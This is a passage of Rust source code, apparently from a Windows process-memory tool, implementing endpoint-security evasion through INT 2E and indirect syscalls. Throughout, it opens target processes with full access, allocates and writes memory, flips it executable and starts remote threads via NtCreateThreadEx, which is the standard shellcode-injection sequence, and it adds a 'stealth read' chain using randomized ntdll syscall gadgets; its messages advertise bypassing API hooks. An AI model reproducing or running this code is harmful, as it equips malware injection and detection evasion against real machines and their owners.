    tracing::warn!("[EVASION] INT 2E syscall: op={} pid={}", op, pid);

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);
        let h = handle.raw().0 as isize;

        match op {
            "alloc" => {
                let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(4096) as usize;
                let protection = args
                    .get("protection")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0x04) as u32;
                let ssn = resolve_ssn("NtAllocateVirtualMemory")?;
                let stub = build_int2e_stub(ssn)?;

                type NtAllocFn = unsafe extern "system" fn(
                    isize,
                    *mut *mut std::ffi::c_void,
                    usize,
                    *mut usize,
                    u32,
                    u32,
                ) -> i32;
                let syscall_fn: NtAllocFn = std::mem::transmute(stub);
                let mut base_addr: *mut std::ffi::c_void = std::ptr::null_mut();
                let mut region_size = size;
                let status = syscall_fn(h, &mut base_addr, 0, &mut region_size, 0x3000, protection);
                if status < 0 {
                    return Err(MemoricError::WindowsApi(format!(
                        "INT 2E NtAllocateVirtualMemory failed: 0x{:08X}",
                        status as u32
                    )));
                }
                Ok(serde_json::json!({
                    "success": true,
                    "technique": "int2e_syscall",
                    "op": "alloc",
                    "ssn": ssn,
                    "address": format!("0x{:016X}", base_addr as usize),
                    "size": region_size,
                    "message": "Memory allocated via INT 2E gate (bypasses SYSCALL opcode hooks)"
                }))
            }
            "write" => {
                let address = args
                    .get("address")
                    .and_then(parse_address)
                    .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
                let bytes = args
                    .get("bytes")
                    .and_then(|v| v.as_array())
                    .ok_or_else(|| MemoricError::MemoryAccess("Missing bytes".to_string()))?;
                let byte_vec: Vec<u8> = bytes
                    .iter()
                    .filter_map(|v| v.as_u64())
                    .map(|v| v as u8)
                    .collect();

                let ssn = resolve_ssn("NtWriteVirtualMemory")?;
                let stub = build_int2e_stub(ssn)?;

                type NtWriteFn = unsafe extern "system" fn(
                    isize,
                    *mut std::ffi::c_void,
                    *const std::ffi::c_void,
                    usize,
                    *mut usize,
                ) -> i32;
                let syscall_fn: NtWriteFn = std::mem::transmute(stub);
                let mut bytes_written = 0usize;
                let status = syscall_fn(
                    h,
                    address as *mut _,
                    byte_vec.as_ptr() as *const _,
                    byte_vec.len(),
                    &mut bytes_written,
                );
                if status < 0 {
                    return Err(MemoricError::WindowsApi(format!(
                        "INT 2E NtWriteVirtualMemory failed: 0x{:08X}",
                        status as u32
                    )));
                }
                Ok(serde_json::json!({
                    "success": true,
                    "technique": "int2e_syscall",
                    "op": "write",
                    "ssn": ssn,
                    "bytes_written": bytes_written,
                    "message": "Memory written via INT 2E gate"
                }))
            }
            "protect" => {
                let address = args
                    .get("address")
                    .and_then(parse_address)
                    .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
                let size = args
                    .get("size")
                    .and_then(|v| v.as_u64())
                    .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
                    as usize;
                let protection = args
                    .get("protection")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0x20) as u32;

                let ssn = resolve_ssn("NtProtectVirtualMemory")?;
                let stub = build_int2e_stub(ssn)?;

                type NtProtectFn = unsafe extern "system" fn(
                    isize,
                    *mut *mut std::ffi::c_void,
                    *mut usize,
                    u32,
                    *mut u32,
                ) -> i32;
                let syscall_fn: NtProtectFn = std::mem::transmute(stub);
                let mut base = address as *mut std::ffi::c_void;
                let mut region_size = size;
                let mut old_prot = 0u32;
                let status = syscall_fn(h, &mut base, &mut region_size, protection, &mut old_prot);
                if status < 0 {
                    return Err(MemoricError::WindowsApi(format!(
                        "INT 2E NtProtectVirtualMemory failed: 0x{:08X}",
                        status as u32
                    )));
                }
                Ok(serde_json::json!({
                    "success": true,
                    "technique": "int2e_syscall",
                    "op": "protect",
                    "ssn": ssn,
                    "old_protection": format!("0x{:X}", old_prot),
                    "message": "Memory protection changed via INT 2E gate"
                }))
            }
            "create_thread" => {
                let start_address = args
                    .get("start_address")
                    .and_then(parse_address)
                    .ok_or_else(|| {
                        MemoricError::InjectionFailed("Missing start_address".to_string())
                    })?;
                let ssn = resolve_ssn("NtCreateThreadEx")?;
                let stub = build_int2e_stub(ssn)?;

                type NtCreateThreadExFn = unsafe extern "system" fn(
                    *mut isize,
                    u32,
                    *mut std::ffi::c_void,
                    isize,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    u32,
                    usize,
                    usize,
                    usize,
                    *mut std::ffi::c_void,
                ) -> i32;
                let syscall_fn: NtCreateThreadExFn = std::mem::transmute(stub);
                let mut thread_handle: isize = 0;
                let status = syscall_fn(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    h,
                    start_address as *mut _,
                    std::ptr::null_mut(),
                    0,
                    0,
                    0,
                    0,
                    std::ptr::null_mut(),
                );
                if status < 0 {
                    return Err(MemoricError::InjectionFailed(format!(
                        "INT 2E NtCreateThreadEx failed: 0x{:08X}",
                        status as u32
                    )));
                }
                Ok(serde_json::json!({
                    "success": true,
                    "technique": "int2e_syscall",
                    "op": "create_thread",
                    "ssn": ssn,
                    "thread_handle": thread_handle,
                    "message": "Thread created via INT 2E gate"
                }))
            }
            _ => Err(MemoricError::WindowsApi(format!(
                "Unknown int2e op: {}. Use: alloc, write, protect, create_thread",
                op
            ))),
        }
    }
}

// ═════════════════════════════════════════════════════════════════
// 2.4 — Extended indirect syscall coverage
// NtOpenProcess, NtReadVirtualMemory, NtQueryVirtualMemory,
// NtClose, NtFreeVirtualMemory
// ═════════════════════════════════════════════════════════════════

/// NtOpenProcess via indirect syscall — stealthily open a process handle
pub fn indirect_syscall_open_process(args: &Value) -> Result<Value, MemoricError> {
    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))? as u32;
    let access = args
        .get("access")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x1FFFFF) as u32; // PROCESS_ALL_ACCESS

    tracing::warn!(
        "[EVASION] Indirect syscall NtOpenProcess: PID={}, access=0x{:X}",
        pid,
        access
    );

    let ssn = resolve_ssn("NtOpenProcess")?;
    let gadget = find_syscall_ret_gadget()?;
    let stub = build_indirect_syscall_stub(ssn, gadget)?;

    unsafe {
        // NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId)
        // CLIENT_ID: {UniqueProcess, UniqueThread}
        // OBJECT_ATTRIBUTES: minimal zero-init is sufficient
        #[repr(C)]
        struct ClientId {
            unique_process: usize,
            unique_thread: usize,
        }

        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: usize,
            object_name: usize,
            attributes: u32,
            security_descriptor: usize,
            security_qos: usize,
        }

        type NtOpenProcessFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *const ObjectAttributes,
            *const ClientId,
        ) -> i32;

        let syscall_fn: NtOpenProcessFn = std::mem::transmute(stub);

        let client_id = ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };

        let obj_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name: 0,
            attributes: 0,
            security_descriptor: 0,
            security_qos: 0,
        };

        let mut process_handle: isize = 0;
        let status = syscall_fn(&mut process_handle, access, &obj_attr, &client_id);

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtOpenProcess failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "function": "NtOpenProcess",
            "ssn": ssn,
            "pid": pid,
            "handle": process_handle,
            "access": format!("0x{:X}", access),
            "gadget_address": format!("0x{:016X}", gadget),
            "message": "Process opened via indirect syscall (bypasses OpenProcess hooks)"
        }))
    }
}

/// NtReadVirtualMemory via indirect syscall — read memory without triggering hooked ReadProcessMemory
pub fn indirect_syscall_read(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_READ};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(256) as usize;

    tracing::info!(
        "[EVASION] Indirect syscall NtReadVirtualMemory: PID={} addr=0x{:X} size={}",
        pid,
        address,
        size
    );

    let ssn = resolve_ssn("NtReadVirtualMemory")?;
    let gadget = find_syscall_ret_gadget()?;
    let stub = build_indirect_syscall_stub(ssn, gadget)?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_READ, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesRead)
        type NtReadVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *const std::ffi::c_void,
            *mut std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        let syscall_fn: NtReadVirtualMemoryFn = std::mem::transmute(stub);
        let mut buffer = vec![0u8; size];
        let mut bytes_read = 0usize;

        let status = syscall_fn(
            handle.raw().0 as isize,
            address as *const std::ffi::c_void,
            buffer.as_mut_ptr() as *mut std::ffi::c_void,
            size,
            &mut bytes_read,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtReadVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        buffer.truncate(bytes_read);

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "function": "NtReadVirtualMemory",
            "ssn": ssn,
            "address": format!("0x{:016X}", address),
            "bytes_read": bytes_read,
            "hex": hex::encode(&buffer),
            "gadget_address": format!("0x{:016X}", gadget),
            "message": "Memory read via indirect syscall (bypasses ReadProcessMemory hooks)"
        }))
    }
}

/// NtQueryVirtualMemory via indirect syscall — query memory regions without triggering VirtualQueryEx hooks
pub fn indirect_syscall_query(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args.get("address").and_then(parse_address).unwrap_or(0);

    tracing::info!(
        "[EVASION] Indirect syscall NtQueryVirtualMemory: PID={} addr=0x{:X}",
        pid,
        address
    );

    let ssn = resolve_ssn("NtQueryVirtualMemory")?;
    let gadget = find_syscall_ret_gadget()?;
    let stub = build_indirect_syscall_stub(ssn, gadget)?;

    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // NtQueryVirtualMemory(ProcessHandle, BaseAddress, MemInfoClass, MemInfo, MemInfoLength, ReturnLength)
        // MemoryBasicInformation = 0
        type NtQueryVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *const std::ffi::c_void,
            u32,
            *mut std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        let syscall_fn: NtQueryVirtualMemoryFn = std::mem::transmute(stub);
        let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
        let mut return_length = 0usize;

        let status = syscall_fn(
            handle.raw().0 as isize,
            address as *const std::ffi::c_void,
            0, // MemoryBasicInformation
            &mut mbi as *mut _ as *mut std::ffi::c_void,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            &mut return_length,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtQueryVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "function": "NtQueryVirtualMemory",
            "ssn": ssn,
            "base_address": format!("0x{:016X}", mbi.BaseAddress as u64),
            "allocation_base": format!("0x{:016X}", mbi.AllocationBase as u64),
            "region_size": mbi.RegionSize,
            "state": format!("0x{:X}", mbi.State.0),
            "type": format!("0x{:X}", mbi.Type.0),
            "protect": format!("0x{:X}", mbi.Protect.0),
            "allocation_protect": format!("0x{:X}", mbi.AllocationProtect.0),
            "gadget_address": format!("0x{:016X}", gadget),
            "message": "Memory region queried via indirect syscall"
        }))
    }
}

/// NtClose via indirect syscall — close handle without triggering ntdll hooks
pub fn indirect_syscall_close(args: &Value) -> Result<Value, MemoricError> {
    let handle_val = args
        .get("handle")
        .and_then(|v| v.as_i64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing handle".to_string()))?;

    tracing::info!("[EVASION] Indirect syscall NtClose: handle={}", handle_val);

    let ssn = resolve_ssn("NtClose")?;
    let gadget = find_syscall_ret_gadget()?;
    let stub = build_indirect_syscall_stub(ssn, gadget)?;

    unsafe {
        type NtCloseFn = unsafe extern "system" fn(isize) -> i32;
        let syscall_fn: NtCloseFn = std::mem::transmute(stub);
        let status = syscall_fn(handle_val as isize);

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtClose failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "function": "NtClose",
            "ssn": ssn,
            "handle": handle_val,
            "gadget_address": format!("0x{:016X}", gadget),
            "message": "Handle closed via indirect syscall"
        }))
    }
}

/// NtFreeVirtualMemory via indirect syscall
pub fn indirect_syscall_free(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;

    tracing::info!(
        "[EVASION] Indirect syscall NtFreeVirtualMemory: PID={} addr=0x{:X}",
        pid,
        address
    );

    let ssn = resolve_ssn("NtFreeVirtualMemory")?;
    let gadget = find_syscall_ret_gadget()?;
    let stub = build_indirect_syscall_stub(ssn, gadget)?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // NtFreeVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, FreeType)
        type NtFreeVirtualMemoryFn =
            unsafe extern "system" fn(isize, *mut *mut std::ffi::c_void, *mut usize, u32) -> i32;

        let syscall_fn: NtFreeVirtualMemoryFn = std::mem::transmute(stub);
        let mut base_addr = address as *mut std::ffi::c_void;
        let mut region_size = 0usize;

        let status = syscall_fn(
            handle.raw().0 as isize,
            &mut base_addr,
            &mut region_size,
            0x8000, // MEM_RELEASE
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtFreeVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "function": "NtFreeVirtualMemory",
            "ssn": ssn,
            "address": format!("0x{:016X}", address),
            "gadget_address": format!("0x{:016X}", gadget),
            "message": "Memory freed via indirect syscall"
        }))
    }
}

/// Full indirect syscall chain for stealthy process interaction
/// Opens process, reads memory, closes handle — entirely via indirect syscalls
pub fn indirect_syscall_stealth_read(args: &Value) -> Result<Value, MemoricError> {
    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))? as u32;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(256) as usize;

    tracing::warn!(
        "[EVASION] Full indirect syscall stealth read: PID={} addr=0x{:X}",
        pid,
        address
    );

    let gadgets = find_all_syscall_gadgets()?;

    // Resolve all SSNs upfront
    let ssn_open = resolve_ssn("NtOpenProcess")?;
    let ssn_read = resolve_ssn("NtReadVirtualMemory")?;
    let ssn_close = resolve_ssn("NtClose")?;

    unsafe {
        // Step 1: Open process via syscall
        #[repr(C)]
        struct ClientId {
            unique_process: usize,
            unique_thread: usize,
        }
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: usize,
            object_name: usize,
            attributes: u32,
            security_descriptor: usize,
            security_qos: usize,
        }

        let stub_open = build_indirect_syscall_stub(ssn_open, pick_random_gadget(&gadgets))?;
        type NtOpenProcessFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *const ObjectAttributes,
            *const ClientId,
        ) -> i32;
        let open_fn: NtOpenProcessFn = std::mem::transmute(stub_open);

        let cid = ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };
        let oa = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name: 0,
            attributes: 0,
            security_descriptor: 0,
            security_qos: 0,
        };
        let mut process_handle: isize = 0;

        let status = open_fn(&mut process_handle, 0x0010, &oa, &cid); // PROCESS_VM_READ
        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtOpenProcess failed: 0x{:08X}",
                status as u32
            )));
        }

        // Step 2: Read memory via syscall
        let stub_read = build_indirect_syscall_stub(ssn_read, pick_random_gadget(&gadgets))?;
        type NtReadFn = unsafe extern "system" fn(
            isize,
            *const std::ffi::c_void,
            *mut std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;
        let read_fn: NtReadFn = std::mem::transmute(stub_read);

        let mut buffer = vec![0u8; size];
        let mut bytes_read = 0usize;
        let status = read_fn(
            process_handle,
            address as *const _,
            buffer.as_mut_ptr() as *mut _,
            size,
            &mut bytes_read,
        );

        // Step 3: Close handle via syscall (always, even if read failed)
        let stub_close = build_indirect_syscall_stub(ssn_close, pick_random_gadget(&gadgets))?;
        type NtCloseFn = unsafe extern "system" fn(isize) -> i32;
        let close_fn: NtCloseFn = std::mem::transmute(stub_close);
        let _ = close_fn(process_handle);

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtReadVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        buffer.truncate(bytes_read);

        Ok(serde_json::json!({
            "success": true,
            "technique": "full_indirect_syscall_chain",
            "functions": ["NtOpenProcess", "NtReadVirtualMemory", "NtClose"],
            "ssns": { "open": ssn_open, "read": ssn_read, "close": ssn_close },
            "pid": pid,
            "address": format!("0x{:016X}", address),
            "bytes_read": bytes_read,
            "hex": hex::encode(&buffer),
            "gadgets_used": gadgets.len(),
            "message": "Full stealth read: open→read→close entirely via indirect syscalls (no Win32 API calls)"
        }))
    }
}
